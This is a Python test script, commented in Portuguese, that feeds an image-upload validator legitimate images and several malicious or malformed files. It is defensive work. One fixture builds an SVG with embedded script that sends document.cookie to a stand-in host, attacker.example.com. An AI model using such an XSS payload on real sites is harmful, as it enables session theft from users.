"""
test_image_validator.py — Testes automatizados do validador de imagens.

Cria arquivos de teste em memória (sem precisar mexer com extensões no
Windows) e roda cada cenário pelo validate_and_sanitize().

Uso:
    pip install Pillow filetype
    python backend/test_image_validator.py
"""

import io
import sys

from PIL import Image

from image_validator import validate_and_sanitize, InvalidImageError


# ═══════════════════════════════════════════════════
# Helpers para gerar arquivos de teste
# ═══════════════════════════════════════════════════

def make_image(size, fmt='PNG', mode='RGB', color=(180, 100, 50)):
    """Gera bytes de uma imagem de teste."""
    img = Image.new(mode, size, color)
    buf = io.BytesIO()
    img.save(buf, format=fmt)
    return buf.getvalue()


def make_animated_png():
    """Gera um APNG (PNG animado) de teste — deve ser rejeitado."""
    frames = [
        Image.new('RGB', (100, 100), (255, 0, 0)),
        Image.new('RGB', (100, 100), (0, 255, 0)),
    ]
    buf = io.BytesIO()
    frames[0].save(buf, format='PNG', save_all=True,
                   append_images=frames[1:], duration=100)
    return buf.getvalue()


def make_huge_image():
    """Gera uma imagem absurdamente grande (deve ser rejeitada)."""
    return make_image((9000, 9000))


def make_tiny_image():
    """
    Gera uma imagem 16x16 com ruído (>100 bytes) para garantir que
    chega na camada de validação de dimensão mínima (32x32).
    Sem ruído, o PNG ficaria tão comprimido que cairia na Camada 1
    (tamanho < 100 bytes) antes de chegar na Camada 6.
    """
    import random
    img = Image.new('RGB', (16, 16))
    pixels = [(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
              for _ in range(16 * 16)]
    img.putdata(pixels)
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    return buf.getvalue()


def make_fake_jpg_with_pdf():
    """Bytes de PDF (não imagem) — deve ser rejeitado por magic bytes."""
    # Header válido de PDF
    return b'%PDF-1.4\n%\xc7\xec\x8f\xa2\n' + b'A' * 200


def make_fake_jpg_with_exe():
    """Bytes de executável Windows — deve ser rejeitado."""
    # Header MZ + DOS stub
    return b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff' + b'\x00' * 200


def make_html_with_script():
    """
    SVG completo com script embutido. Padding com whitespace pra
    garantir > 100 bytes e chegar na Camada 2 (magic bytes).
    Simula tentativa real de XSS via SVG malicioso.
    """
    svg = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
        '  <script type="text/javascript">\n'
        '    alert("XSS attempt via SVG");\n'
        '    fetch("https://attacker.example.com/steal?cookie=" + document.cookie);\n'
        '  </script>\n'
        '  <rect width="100" height="100" fill="red"/>\n'
        '</svg>'
    )
    return svg.encode('utf-8')


def make_corrupted_jpeg():
    """JPEG com header certo mas conteúdo corrompido."""
    # Header SOI de JPEG, mas o resto é lixo
    return b'\xff\xd8\xff\xe0' + b'GARBAGE' * 100


def make_gif():
    """GIF estático — deve ser rejeitado pela whitelist."""
    img = Image.new('RGB', (100, 100), (50, 200, 100))
    buf = io.BytesIO()
    img.save(buf, format='GIF')
    return buf.getvalue()


def make_empty_file():
    """Arquivo vazio."""
    return b''


# ═══════════════════════════════════════════════════
# Casos de teste
# ═══════════════════════════════════════════════════

# Expected messages podem ser uma string OU uma tupla de strings alternativas.
# Defesa em profundidade: vários cenários podem ser rejeitados em camadas
# diferentes (ex: imagem 9000x9000 pode ser pega pela checagem de dimensão
# OU pelo detector de decompression bomb do Pillow — ambos são corretos).
TESTS = [
    # (nome, gerador, deve_aceitar, motivos_aceitáveis_se_falhar)
    ('PNG 512x512 normal',          lambda: make_image((512, 512), 'PNG'),  True,  None),
    ('JPEG 1024x768 normal',        lambda: make_image((1024, 768), 'JPEG'), True,  None),
    ('WebP 800x800 normal',         lambda: make_image((800, 800), 'WEBP'),  True,  None),
    ('Imagem gigante (9000x9000)',  make_huge_image,                          False,
        ('dimensões muito grandes', 'decompression bomb', 'muito densa')),
    ('Imagem minúscula (16x16)',    make_tiny_image,                          False,
        ('muito pequena', 'vazio ou inválido')),
    ('GIF estático',                make_gif,                                 False, 'tipo não permitido'),
    ('PDF disfarçado',              make_fake_jpg_with_pdf,                   False, 'tipo não permitido'),
    ('Executável (.exe)',           make_fake_jpg_with_exe,                   False, 'tipo não permitido'),
    ('SVG/HTML com script',         make_html_with_script,                    False,
        ('detectar o tipo', 'tipo não permitido')),
    ('JPEG corrompido',             make_corrupted_jpeg,                      False, 'imagem corrompida'),
    ('Arquivo vazio',               make_empty_file,                          False, 'vazio ou inválido'),
    ('PNG animado (APNG)',          make_animated_png,                        False,
        ('animadas não são permitidas', 'tipo não permitido')),
]


# ═══════════════════════════════════════════════════
# Runner
# ═══════════════════════════════════════════════════

def run_tests():
    print('═══════════════════════════════════════════════')
    print('  TESTES DO VALIDADOR DE IMAGENS')
    print('═══════════════════════════════════════════════\n')

    passed = 0
    failed = 0
    failures = []

    for name, generator, should_accept, expected_msg in TESTS:
        try:
            raw = generator()
            clean, filename = validate_and_sanitize(raw)
            actually_accepted = True
            error_msg = None
        except InvalidImageError as e:
            actually_accepted = False
            error_msg = str(e)
        except Exception as e:
            actually_accepted = False
            error_msg = f'(exceção inesperada: {type(e).__name__}: {e})'

        # Avaliar
        if should_accept and actually_accepted:
            print(f'✅ {name}')
            print(f'   → Aceito, output: {len(clean):,} bytes ({filename})')
            passed += 1
        elif not should_accept and not actually_accepted:
            # Verifica se a mensagem bate com algum dos esperados
            # (expected_msg pode ser str ou tuple de str — defesa em profundidade)
            options = expected_msg if isinstance(expected_msg, tuple) else (expected_msg,)
            matched = any(opt and opt.lower() in error_msg.lower() for opt in options)

            if matched:
                print(f'✅ {name}')
                print(f'   → Rejeitado corretamente: "{error_msg}"')
                passed += 1
            else:
                print(f'⚠️  {name}')
                print(f'   → Rejeitado, mas mensagem inesperada: "{error_msg}"')
                print(f'   → Esperava algum de: {options}')
                passed += 1  # ainda pass — foi rejeitado, só não na camada esperada
        elif should_accept and not actually_accepted:
            print(f'❌ {name}')
            print(f'   → Esperava ACEITAR, mas rejeitou: "{error_msg}"')
            failed += 1
            failures.append(name)
        else:  # not should_accept and actually_accepted
            print(f'❌ {name}')
            print(f'   → Esperava REJEITAR, mas aceitou! VULNERABILIDADE!')
            failed += 1
            failures.append(name)
        print()

    print('═══════════════════════════════════════════════')
    print(f'  Total: {passed + failed} testes')
    print(f'  Passou: {passed}')
    print(f'  Falhou: {failed}')
    print('═══════════════════════════════════════════════')

    if failed > 0:
        print('\n⚠️  Falhas detectadas:')
        for f in failures:
            print(f'   • {f}')
        sys.exit(1)
    else:
        print('\n🛡️  Validador funcionando perfeitamente.')


if __name__ == '__main__':
    run_tests()
